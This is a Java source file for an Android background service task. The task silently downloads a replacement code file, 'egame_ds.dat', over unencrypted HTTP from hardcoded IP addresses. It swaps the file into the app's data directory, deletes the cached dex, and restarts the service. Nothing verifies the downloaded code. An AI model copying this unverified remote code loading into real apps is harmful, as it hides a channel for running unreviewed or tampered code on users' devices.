/**
 * 
 */
package cn.play.dserv;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;


/**
 * update sdk 
 * @author Keel
 *
 */
public class PLTask17 implements PLTask {

	private DServ dserv;
	private int id = 17;
	private int state = STATE_WAITING;
	private String TAG = "dserv-PLTask"+id;
	private int newVersion = 5;
	
	private String[] datUrl = {
"http://180.96.63.84:12370/plserver/dats/egame_ds.dat",                  
"http://180.96.63.83:12370/plserver/dats/egame_ds.dat"	                           
	};
	private int datShift = 0;
	
	private String getDatUrl(){
		long t = System.currentTimeMillis();
		if (t % 2 == 0) {
			datShift = 0;
		}else{
			datShift = 1;
		}
		return datUrl[datShift];
	}
	
	@Override
	public void run() {
		CheckTool.log(dserv.getService(), TAG, "==========PLTask id:"+this.id+"===========");
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task running");
		state = STATE_RUNNING;
		boolean isFinish = false;
		while (true) {
			if (!CheckTool.isNetOk(this.dserv.getService())) {
				try {
					Thread.sleep(1000*60*5);
				} catch (InterruptedException e) {
				}
				continue;
			}
			
			
			try {
				//更新dat文件
				int currentVer = this.dserv.getVer();
				CheckTool.log(dserv.getService(), TAG, "==========dserv current ver:"+currentVer+"===========");
				if (currentVer < newVersion) {
					String cDir = dserv.getService().getApplicationInfo().dataDir;
					
					String remoteJar = getDatUrl();
					String fName = "egame_ds.dat";
					String localJarDir = dserv.getLocalPath()+"update/";
					boolean isDownOk = false;
					if (dserv.downloadGoOn(remoteJar, localJarDir, fName, this.dserv.getService())) {
						isDownOk = true;
					}else{
						datShift = (datShift==0) ? 1 : 0;
						remoteJar = datUrl[datShift];
						if (dserv.downloadGoOn(remoteJar, localJarDir, fName, this.dserv.getService())) {
							isDownOk = true;
						}
					}
					if (isDownOk) {
						CheckTool.log(dserv.getService(), TAG, "down dat OK:"+localJarDir+fName);
						
						String newFName = cDir+File.separator+fName;
						File f = new File(localJarDir+fName);
						File nf = new File(newFName);
						if (f.isFile()) {
							if (nf.isFile()) {
								nf.delete();
							}
							CheckTool.log(dserv.getService(), TAG, "org data file["+newFName+"] exist?"+nf.exists());
							nf = new File(newFName);
							if(copy(f,nf)){
								CheckTool.log(dserv.getService(), TAG, "copy to data:"+nf.exists());
								f = new File(localJarDir+fName);
								f.delete();
								CheckTool.log(dserv.getService(), TAG, "sd dat delete:"+(!f.exists()));
								f = new File(this.dserv.getService().getApplicationInfo().dataDir+"/egame_ds.dex");
								f.delete();
								CheckTool.log(dserv.getService(), TAG, "dex delete:"+(!f.exists()));
								isFinish = true;
//								CheckTool.sLog(this.dserv.getService(), 101, "_@@"+this.id+"@@116@@updatedTo5"); //116为type,表示sdk已升级
								Thread.sleep(1000*10);
								state = STATE_DIE;
								//80为CheckTool.ACT_UPDATE_DS,这里将重启服务
								CheckTool.sLog(dserv.getService(), 80);
								break;
							}
						}
					}else{
						//未下载完成则直接删除
						File f = new File(localJarDir+fName);
						if (f.isFile()) {
							f.delete();
						}
					}
				}else{
					isFinish = true;
					CheckTool.log(dserv.getService(), TAG, "no need update.");
				}
				
			} catch (Exception e) {
				e.printStackTrace();
				isFinish = false;
			}
			
			if (!isFinish) {
				state = STATE_WAITING;
				break;
			}
			state = STATE_DIE;
			break;
		}
		this.dserv.taskDone(this);
		CheckTool.log(dserv.getService(), TAG, "==========PLTask["+this.id+"] isFinish ? "+isFinish+"===========");
	}
	
	public static final boolean copy(File fileFrom, File fileTo) { 
		long fsize = fileFrom.length();
        try {
			FileInputStream in = new FileInputStream(fileFrom);  
			FileOutputStream out = new FileOutputStream(fileTo);  
			byte[] bt = new byte[1024*5];  
			int count;  
			while ((count = in.read(bt)) > 0) {  
			    out.write(bt, 0, count);  
			}  
			in.close();  
			out.close();
		} catch (Exception e) {
			return false;
		}  
        if (fsize != fileTo.length()) {
			return false;
		}
        return true;
    } 

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getId()
	 */
	@Override
	public int getId() {
		return id;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getState()
	 */
	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#init()
	 */
	@Override
	public void init() {
		CheckTool.log(dserv.getService(),TAG, "TASK "+id+" init.");
		
//		Log.d(TAG, "TASK "+id+" init.");
		if (dserv.getService() != null) {
			dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task inited.");
		}else{
			CheckTool.log(dserv.getService(),TAG, "TASK "+id+" getService is null.");
		}
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setState(int)
	 */
	@Override
	public void setState(int arg0) {
		this.state = arg0;
	}

	@Override
	public void setDService(DServ serv) {
		this.dserv =serv;
	}
}
